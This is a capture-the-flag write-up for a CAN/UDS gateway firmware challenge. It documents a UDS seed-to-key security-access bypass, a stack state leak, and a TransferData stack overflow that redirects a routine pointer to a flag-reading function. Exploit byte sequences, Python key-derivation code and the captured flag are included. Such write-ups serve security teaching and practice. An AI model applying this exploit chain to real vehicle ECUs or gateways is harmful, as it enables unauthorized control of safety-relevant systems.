# Pitlane Can Gateway

Author: thek0der

Points: 356

Flag: `CTFAC{598bd382ee3bdb7f14f8fa22a0546a68557d01d4be495b509e7f157ffb13b1af}`

## Summary

The firmware exposes a UDS service over a custom 20-byte `PCAN` wrapper. After unpacking the firmware and reversing the gateway daemon, the intended update path turned out to be vulnerable to a stack overwrite in `TransferData`.

The exploit chain is:

1. Enter programming session with `0x10 0x02`.
2. Unlock security access via `0x27 0x01` / `0x27 0x02`.
3. Read `0x22 F1 D0` to recover the live per-process control words.
4. Start a download with size `0x01a0`.
5. Abuse `0x36` to overflow a `0x180`-byte stack buffer into the adjacent routine-control state.
6. Recompute the integrity word and retarget the routine pointer from the benign stub at `0x7880` to the hidden flag routine at `0x7910`.
7. Trigger `0x31 0x01 0xD0 0x01` and receive the flag in the response.

## Firmware Layout

The provided wrapper script loads a custom firmware image, unpacks the `loader` initramfs, injects `/flag.txt`, and then launches the daemon inside QEMU. The relevant binary is:

- `/usr/sbin/pitlane_gatewayd`

The firmware also contains two blobs that matter for security access:

- `pitlane_factory.bin`
- `pitlane_calib.bin`

From those blobs:

- `calib[8:12] = 0xaa12004d`
- `factory[16:20] = 0x4bd91f73`

Those two dwords are the only static inputs needed for the seed-to-key transform.

## Protocol Recovery

The daemon reads fixed 20-byte packets with this layout:

```text
offset  size  meaning
0x00    4     "PCAN"
0x04    4     CAN ID (little-endian)
0x08    1     DLC
0x09    3     zero / reserved
0x0c    8     CAN payload
```

The gateway accepts requests on CAN ID `0x7e0` and responds on `0x7e8`.

Inside the 8-byte CAN payload it speaks ISO-TP and then UDS.

Useful services:

- `0x10 0x02` -> programming session
- `0x27 0x01` -> seed request
- `0x27 0x02 <key>` -> unlock
- `0x22 0xF1 0xD0` -> leaks internal state after unlock
- `0x34 0x00 0x44 <size_be16>` -> request download
- `0x36 <seq> <data...>` -> transfer data
- `0x31 0x01 0xD0 0x01` -> routine control

One implementation quirk matters operationally: when the client sends a flow-control frame to receive a multi-frame response, the daemon later mis-parses that FC frame as a fresh request and queues a bogus `7f0031` response. The solver simply drains that extra packet after reading `F1D0`.

## Security Access

The key check in the `0x27 0x02` handler reduces to:

```python
def key_from_seed(seed):
    x = seed & 0xffffffff
    x ^= rol32(0xaa12004d, 5)
    x ^= 0x4bd91f73
    x ^= 0x93d7a51b
    x = ((x >> 16) ^ x) & 0xffffffff
    x = (x * 0x7feb352d) & 0xffffffff
    x = ((x >> 15) ^ x) & 0xffffffff
    x = (x * 0x846ca68b) & 0xffffffff
    return ((x >> 16) ^ x) & 0xffffffff
```

The seed is sent in big-endian form inside the positive `0x67 0x01` response. The key must also be sent big-endian.

## State Leak via `0x22 F1D0`

After unlocking, DID `F1D0` returns:

```text
62 f1 d0 || q1 || q2 || q3 || q4
```

where the four qwords are little-endian in the response payload.

They decode to the live stack state used by the routine-control path:

```python
v250 = ror64(q1, 11) ^ 0x243f6a8885a308d3
v238 = ror64(q2, 47) ^ v250 ^ 0x13198a2e03707344
v248 = ror64(q3, 23) ^ v250 ^ 0xa4093822299f31d0
target = v248 ^ 0xe7037ed1a0b428db ^ rol64(v238, 43)
```

On both local and remote instances, `target` resolves to the harmless stub at file offset `0x7880`.

## Vulnerability

The update state lives in one stack frame.

Relevant layout:

```text
[rsp+0x0b8]  transfer buffer, 0x180 bytes
[rsp+0x238]  qword v238
[rsp+0x240]  qword auth word
[rsp+0x248]  qword v248
[rsp+0x250]  qword v250
```

`RequestDownload` accepts sizes up to `0x01a0`, but the actual stack buffer is only `0x0180`.

`TransferData` writes user-controlled data to:

```text
buffer + (seq * 8)
```

and allows a large per-message payload because the daemon reassembles multi-frame UDS requests before processing them.

The maximum accepted size is exactly what we need:

- choose `size = 0x01a0`
- choose `seq = 0x2f`
- send `40` bytes of transfer data

That writes to:

```text
0x178 .. 0x19f
```

which covers the last 8 bytes of the real buffer plus:

- `v238`
- `auth word`
- `v248`
- `v250`

## Pivoting the Routine Pointer

`0x31 0x01 0xD0 0x01` validates the overwritten state and then computes a function pointer:

```python
call_target = v248 ^ 0xe7037ed1a0b428db ^ rol64(v238, 43)
```

The adjacent function at `0x7910` reads `/flag.txt` and returns:

```text
71 01 d0 01 || sanitized_flag
```

So the exploit keeps `v238` unchanged, moves the routine target by `+0x90`, and updates `v248` accordingly:

```python
new_target = old_target + 0x90
new_v248 = old_v248 ^ old_target ^ new_target
```

The handler also checks an integrity qword stored at `[rsp+0x240]`. That value is:

```python
def mix64(x):
    x ^= x >> 30
    x *= 0xbf58476d1ce4e5b9
    x ^= x >> 27
    x *= 0x94d049bb133111eb
    x ^= x >> 31
    return x & 0xffffffffffffffff

new_auth = mix64(new_v238 ^ 0x94d049bb133111eb ^ rol64(new_v248, 55))
```

The overflowing `0x36` payload is:

```text
"A" * 8
|| new_v238
|| new_auth
|| new_v248
|| old_v250
```

all written in little-endian qword form.

## Final Exploit Sequence

1. `10 02`
2. `27 01`
3. `27 02 <derived key>`
4. `22 F1 D0`
5. Drain the queued bogus `7f0031`
6. `34 00 44 01 a0`
7. `36 2f <40-byte overflow>`
8. `31 01 d0 01`

The final response is multi-frame and contains:

```text
71 01 d0 01 CTFAC{...}
```

## Artifacts Saved

- Solver: `ac26/solve_pitlane_can_gateway.py`
- Writeup: `ac26/pitlane_can_gateway_writeup.md`

Running the solver prints the remote flag directly.

---
* [🔙 Back to Hardware Directory](../)
* [🔙 Back to Hardware Index Directory](../INDEX.md)
* [🔙 Back to Main Directory](../../README.md)
